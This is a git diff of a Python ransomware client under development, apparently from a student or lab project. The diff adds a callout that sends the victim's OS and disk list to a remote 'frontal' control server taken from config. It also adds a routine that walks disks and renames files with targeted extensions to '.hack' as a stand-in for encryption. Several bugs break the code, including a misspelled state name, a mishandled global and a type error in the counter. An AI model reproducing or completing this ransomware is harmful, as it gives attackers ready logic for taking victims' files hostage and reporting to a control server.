@@ -12,6 +12,8 @@ from utile.network import *
 
 
 LAST_STATE = None
+IP_FRONTAL = ''
+PORT_FRONTAL = 0
 
 def initialize():
     global LAST_STATE
@@ -30,12 +32,13 @@ def initialize():
     msg = message.get_message('initialize_req', [hash_i, os, disks])
     config.set_config('OS', os)
     config.set_config('DISKS', disks)
-    config.save_config('configs/ransomware.json', 'configs/ransomware.key')
+    config.save_config('ransomware/configs/ransomware.json', 'ransomware/configs/ransomware.key')
 
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.connect(('localhost', 8443))
+    s.connect((IP_FRONTAL, PORT_FRONTAL))
     send_msg_clear(s, msg)
     msg = recv_msg_clear(s)
+    print(msg)
     msg_type = message.get_message_type(msg)
 
     if msg_type == 'INITIALIZE_RESP':
@@ -53,9 +56,24 @@ def initialize():
         LAST_STATE = 'INITIALIZE'
 
 def attaque():
-    print('todo')
+    state = config.get_data_config('LAST_STATE')
+    if state != 'INITIALIZE' and state != 'CRYPT' and state != 'PENDING':
+        return None
 
+    disks = config.get_data_config('DISKS')
+    paths = config.get_data_config('PATHS')
+    f_ext = config.get_data_config('FILE_EXT')
+    nb_file_encrypted = config.get_data_config('NB_FILES_ENCRYPTED')
+    if nb_file_encrypted == "None":
+        nb_file_encrypted = 0
 
+    for disk in disks:
+        os.chdir(disk)
+        for folders in paths:
+            for (r, d, f) in os.walk(folders):
+                for names in f:
+                    if os.path.splitext(names)[1] in f_ext:
+                        nb_file_encrypted += chiffre(f'{r}\{names}')
 def chiffre(cible):
     os.rename(f'{cible}', f'{cible}.hack')
     return "Target has been encrypted"
@@ -87,5 +105,14 @@ def list_disks():
 
 
 def main():
-    return main
+    global IP_FRONTAL
+    global PORT_FRONTAL
+    config.load_config('ransomware/configs/ransomware.json', 'ransomware/configs/ransomware.key')
+    IP_FRONTAL = config.get_data_config('IP_FRONTAL')
+    PORT_FRONTAL = config.get_data_config('PORT_FRONTAL')
+    LAST_STATE = config.get_data_config('LAST_STATE')
+    if LAST_STATE == 'None':
+        initialize()
 
+    if LAST_STATE == 'INTIALIZE' or LAST_STATE == 'CRYPT' or LAST_STATE == 'PENDING':
+        attaque()
